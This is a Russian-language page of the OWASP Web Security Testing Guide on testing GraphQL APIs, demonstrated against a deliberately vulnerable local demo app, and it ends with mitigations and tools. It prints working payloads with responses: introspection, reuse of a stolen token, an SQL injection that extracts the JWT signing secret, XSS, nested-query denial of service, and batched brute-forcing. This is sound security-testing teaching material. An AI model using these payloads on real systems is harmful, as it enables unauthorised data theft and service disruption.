---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование GraphQL

|ID          |
|------------|
|WSTG-APIT-01|

## Обзор

GraphQL стал очень популярным в современных API. Он обеспечивает простоту и вложенные объекты, что способствуют ускорению разработки. Хотя каждая технология имеет свои преимущества, она также может нести новые поверхности атаки для приложения. Цель этого сценария — показать некоторые распространённые небезопасные конфигурации и векторы атак на приложения, использующие GraphQL. Некоторые векторы уникальны для GraphQL (например, [запросы интроспекции](#запросы-интроспекции)), а некоторые являются для API типичными (например, [SQL инъекции](#sql-инъекции)).

Примеры в этом разделе будут основаны на уязвимом приложении GraphQL [poc-graphql](https://github.com/righettod/poc-graphql), которое запускается в Docker- контейнере. В качестве уязвимого узла GraphQL служит `localhost:8080/GraphQL`.

## Задачи тестирования

- Убедиться, что развёрнута безопасная и готовая к работе конфигурация.
- Проверить все поля ввода на предмет распространённых атак.
- Убедиться, что применяется надлежащий контроль доступа.

## Как тестировать

Тестирование узлов GraphQL не сильно отличается от тестирования других технологий API. Рассмотрим следующие шаги:

### Запросы интроспекции

Запросы интроспекции — это метод, с помощью которого GraphQL позволяет узнать, какие запросы поддерживаются, какие имеются типы данных, а также многие другие сведения, которые понадобятся при подходе к тестированию GraphQL.

[Определение интроспекции на сайте GraphQL](https://graphql.org/learn/introspection/):

> «Часто бывает полезно запросить у схемы GraphQL информацию о том, какие запросы она поддерживает. GraphQL позволяет нам это делать с помощью системы интроспекции!»

Есть несколько способов извлечь эту информацию и визуализировать результат следующим образом.

#### Использование собственной интроспекции GraphQL

Самый простой способ — отправить HTTP-запрос (например, из Burp или ZAP) со следующей полезной нагрузкой, взятой из статьи на [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Результат обычно бывает очень длинным (здесь даётся с сокращениями), и будет содержать всю схему развёртывания GraphQL.

Ответ:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Для лучшего понимания входной точки GraphQL можно использовать такой инструмент, как [GraphQL Voyager](https://ivangoncharov.github.io/graphql-voyager/):

![GraphQL Voyager](images/Voyager.png)\
*Рисунок 12.1-1: GraphQL Voyager*

Этот инструмент рисует диаграмму взаимосвязей сущностей (англ.: Entity Relationship Diagram, ERD) схемы GraphQL, позволяя лучше изучить взаимодействующие сущности тестируемой системы. Из диаграммы можно увидеть, например, что вы можете запрашивать таблицу Dog. Она также показывает, какими свойствами обладает Dog:

- ID
- name
- veterinary (ID)

У этого инструмента есть один недостаток: GraphQL Voyager отображает не всё, что можно сделать с помощью GraphQL. Например, на рисунке выше не приведены доступные мутации. Лучшей тактикой было бы использовать как Voyager, так и один из инструментов, перечисленных ниже.

#### Использование GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) — это web-среда разработки для GraphQL. Она является частью проекта GraphQL и в основном используется для отладки или разработки. Лучше всего не разрешать доступ к ней пользователям в среде промышленной эксплуатации. Зато в среде тестирования это позволит сэкономить время при работе с запросами интроспекции (хотя вы, конечно, можете использовать интроспекцию в интерфейсе GraphiQL).

GraphiQL has a documentation section, which uses the data from the schema in order to create a document of the GraphQL instance that is being used. This document contains the data types, mutations, and basically every piece of information that can be extracted using introspection.

#### Использование GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) — это клиент GraphQL. Его можно использовать для тестирования различных запросов, а также для разделения IDE GraphQL на разные «площадки» и группировки их по темам. Как и GraphiQL, Playground может создавать документацию без необходимости вручную отправлять запросы на интроспекцию и обрабатывать ответы. У него есть ещё одно большое преимущество: ему не нужен интерфейс GraphiQL. Вы можете направить инструмент на узел GraphQL через URL или использовать его локально с файлом данных. GraphQL Playground можно использовать для прямого тестирования уязвимостей, поэтому свой прокси для отправки HTTP-запросов не понадобится. Это означает, что вы можете использовать этот инструмент для простого взаимодействия и оценки GraphQL. Для других более сложных полезных нагрузок используйте свой прокси (Burp/ZAP и т.п.).

Обратите внимание, что в некоторых случаях вам нужно будет внизу экрана настроить HTTP-заголовки, чтобы включить идентификатор сессии или другой механизм аутентификации. Это по-прежнему позволяет создавать несколько «площадок» с разными разрешениями, чтобы проверить, есть ли проблемы с авторизацией.

![Playground1](images/Playground1.png)\
*Рисунок 12.1-2: Концептуальное описание API в GraphQL Playground*

![Playground2](images/Playground2.png)\
*Рисунок 12.1-3: Схема API в GraphQL Playground*

Вы можете скачать эти схемы для использования в Voyager.

#### Выводы по интроспекции

Интроспекция — полезный инструмент, который позволяет получать больше информации о конкретной реализации GraphQL. Однако он же позволит получить доступ к той же информации и злоумышленникам. Наилучшей практикой считается ограничение доступа к запросам интроспекции, поскольку некоторые инструменты или запросы могут не работать, если эта функция полностью отключена. Поскольку GraphQL обычно подключает API к серверной части системы, необходимо обеспечить строгий контроль доступа.

### Авторизация

Интроспекция — первое место для поиска проблем с авторизацией. Как уже отмечалось, доступ к интроспекции должен быть ограничен, поскольку она позволяет извлекать и собирать данные. Как только тестировщик получит доступ к схеме и узнает где находится чувствительная информация, ему следует пытаться отправлять запросы, и следить, не будут ли они блокироваться из-за недостаточных привилегий. GraphQL не применяет разрешения по умолчанию, поэтому контроль доступа должен проводится посредством самого приложением.

В более ранних примерах результат запроса интроспекции показывает, что существует запрос с именем `auth`. Кажется, это неплохое место для извлечения чувствительной информации, такой как API-токены, пароли и т.п.

![Auth GraphQL Query](images/auth1.png)\
*Рисунок 12.1-4: GraphQL-запрос API Auth*

Тестирование реализации авторизации будет отличаться от развёртывания к развертыванию, поскольку каждая схема содержит разную чувствительную информацию и, следовательно, разные цели, на которых нужно сосредоточиваться.

В этом уязвимом примере каждый пользователь (даже не прошедший аутентификацию) может получить доступ к auth-токенам каждого ветеринара, указанного в базе данных. Эти токены можно использовать для проведения иных действий, разрешённых схемой, например, прикрепление или открепление собаки от указанного ветеринара с помощью мутаций, даже если в запросе для ветеринара нет соответствующего auth-токена.

Ниже пример, в котором тестировщик использует извлечённый токен, которым он не владеет, для выполнения действия от имени ветеринара "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

И ответ:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

Все "dogs" в списке закреплены за "Benoit", а не за владельцем auth-токена. Этот тип действия можно выполнить, если не реализован надлежащий контроль доступа.

### Инъекции

GraphQL  — это реализация API на уровне приложения, и поэтому он обычно перенаправляет запросы на API серверной части или напрямую в базу данных. Это позволяет эксплуатировать любую классическую уязвимость, например, SQL-инъекцию, инъекцию команд, межсайтовые скрипты и т.д. Использование GraphQL просто меняет точку входа вредоносной полезной нагрузки.

Дальнейшие идеи вы можете почерпнуть в других сценариях Руководства по тестированию OWASP.

В GraphQL также есть скаляры, которые обычно применяются в нестандартных типах данных, для которых нет готовых, например, DateTime. Для этих типов встроенный контроль по формату не реализован, что делает их хорошими кандидатами для тестирования.

#### SQL-инъекции

Пример приложения умышленно сделан уязвимым в запросе `dogs(namePrefix: String, limit: Int = 500): [Dog!]`, поскольку параметр `namePrefix` конкатенируется в строке SQL-запроса. Конкатенация вводимых пользователем данных является распространённой ошибкой приложений, которая может подвергнуть их SQL-инъекции.

Следующий запрос извлекает информацию из таблицы `CONFIG` в базе данных:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

Ответ на этот запрос:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

Запрос содержит секрет, который подписывает JWTs в примере приложения, что является очень чувствительной информацией.

Чтобы узнать, что искать в конкретном приложении, будет полезно предварительно собрать информацию о том, как устроено приложение и как организованы таблицы базы данных. Вы также можете использовать такие инструменты, как `sqlmap`, для поиска путей для инъекции и даже для автоматизации извлечения данных из базы данных.

#### Межсайтовый скриптинг (XSS)

возникает, когда злоумышленник вводит исполняемый код, который впоследствии запускается браузером. Подробнее о тестах XSS см. в разделе [Контроль входных данных](../07-Input_Validation_Testing/README.md). Вы можете протестировать отражённый XSS, используя полезную нагрузку из [соответствующего сценария](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

В данном примере ошибки могут отражать входные данные и вызывать XSS.

Полезная нагрузка:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Ответ:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Отказ в обслуживании запросов (DoS)

GraphQL предоставляет очень простой интерфейс, позволяющий разработчикам использовать вложенные запросы и вложенные объекты. Эту возможность также можно использовать злонамеренно, вызывая глубоко вложенный запрос, похожий на рекурсивную функцию, и вызывая отказ в обслуживании из-за использования процессора, памяти или других вычислительных ресурсов.

Вернувшись к *Рисунку 12.1-1*, вы увидите, что можно создать цикл, в котором объект Dog содержит объект Veterinary. Может быть бесконечное количество вложенных объектов.

Допускаются глубоко вложенные запросы, которые могут привести к перегрузке приложения:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Существует несколько мер защиты, которые можно реализовать для предотвращения таких типов запросов, перечисленных в разделе [Как исправить](#как-исправить). Злоупотребление подобными запросами может вызывать такие проблемы, как DoS для GraphQL, и должны быть включены в область тестирование.

### Пакетные атаки

GraphQL поддерживает «упаковку» нескольких запросов в один пакет. Это позволяет пользователям одновременно запрашивать несколько объектов или экземпляров объектов. Однако злоумышленник может использовать эту функциональность для выполнения пакетной атаки. Отправка более одного запроса за раз выглядит следующим образом:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

В примере приложения можно отправить один запрос, чтобы извлечь все имена ветеринаров, используя угадываемый идентификатор (возрастающее целое число). Затем злоумышленник может использовать эти имена для получения токенов доступа. Вместо того, чтобы делать это в нескольких запросах, которые могут быть заблокированы средствами защиты сети, например, WAF или ограничителем частоты запросов, типа Nginx, эти запросы могут быть в одном пакете. Это означает, что нужна всего пара запросов, которые позволят сделать успешный перебор, не боясь быть обнаруженным. Ниже пример запроса:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Он даст злоумышленнику имена ветеринаров, и, как было показано ранее, они могут использоваться для пакетного запроса auth-токенов для нескольких ветеринаров. Например:

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Пакетные атаки могут использоваться для обхода многих мер защиты, применяемых на web-сайтах. Они также могут эксплуатироваться для инвентаризации объектов и перебора при многофакторной аутентификации или другой чувствительной информации.

### Подробное сообщение об ошибке

В GraphQL вы можете столкнуться с непредвиденными ошибками во время выполнения. При возникновении такой ошибки сервер может отправить ответ об ошибке, в котором могут быть раскрыты внутренние сведения об ошибке, конфигурации или данные приложения. Это позволяет злоумышленнику получить дополнительную информацию о приложении. В рамках тестирования сообщения об ошибках следует проверять, отправляя неожидаемые данные — процесс, известный как фаззинг. В ответах следует искать потенциально чувствительную информацию, которая может быть раскрыта с помощью этого метода.

### Раскрытие базового API

GraphQL — относительно новая технология, и некоторые приложения переходят со старых API на GraphQL. Во многих случаях GraphQL развёртывается как стандартный API, который транслирует запросы (отправленные с использованием синтаксиса GraphQL) в базовый API, а также его ответы. Если должным образом не проводится контроль доступа для запросов к базовому API, это может привести к эскалации привилегий.

Например, запрос, содержащий параметр `id=1/delete`, может быть интерпретирован как `/api/users/1/delete`. Это может распространяться на манипуляции с другими ресурсами, принадлежащими `user=1`. Также возможно, что запрос интерпретируется как доступ, предоставленный узлу GraphQL, а не тому, кто его запрашивал.

Тестировщик должен попытаться получить доступ к методам базового API, поскольку может оказаться возможным повысить привилегии.

## Меры защиты

- Ограничить доступ к запросам интроспекции.
- Реализовать контроль входных данных:
    - В GraphQL нет собственного способа контролировать данные, но есть проект с открытым исходным кодом под названием [graphql-constraint-directive](https://github.com/confuser/graphql-constraint-directive), который позволяет контролировать данные на уровне определения схемы.
    - Контроль входных данных — необходимое, но недостаточное решение, и следует принять дополнительные меры для смягчения последствий от инъекций.
- Реализовать меры защиты от злоупотребления запросами:
    - Тайм-ауты: ограничение времени, в течение которого разрешено выполнение запроса.
    - Максимальная глубина запроса: ограничение глубины разрешённых запросов может предотвратить злоупотребление ресурсами слишком глубокими запросами.
    - Максимальная сложность запросов: ограничение сложности запросов, чтобы уменьшить злоупотребление ресурсами GraphQL.
    - Регулирование частоты запросов по времени сервера: ограничение времени сервера, доступного пользователю.
    - Регулирование сложности запросов: ограничение общей сложности запросов, доступных пользователю.
- Типовые сообщения об ошибках: сообщения об ошибках, в которых не раскрываются подробности реализации.
- Предотвращение пакетных атак:
    - Добавить в код ограничение частоты запросов объектов.
    - Не допускать пакетную обработку для конфиденциальных объектов.
    - Ограничить количество запросов, которые могут выполняться одновременно.

За дополнительной информацией об устранении недостатков GraphQL обращайтесь к [Памятке GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Инструменты

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (расширение Burp)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (расширение Burp)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (дополнение для OWASP ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## Ссылки

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [Официальный сайт GraphQL](https://graphql.org/learn/)
- [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [Тестирование на стороне клиента](../11-Client-side_Testing/README.md) (XSS и другие уязвимости)
- [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [Памятка OWASP по GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL-инъекции](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
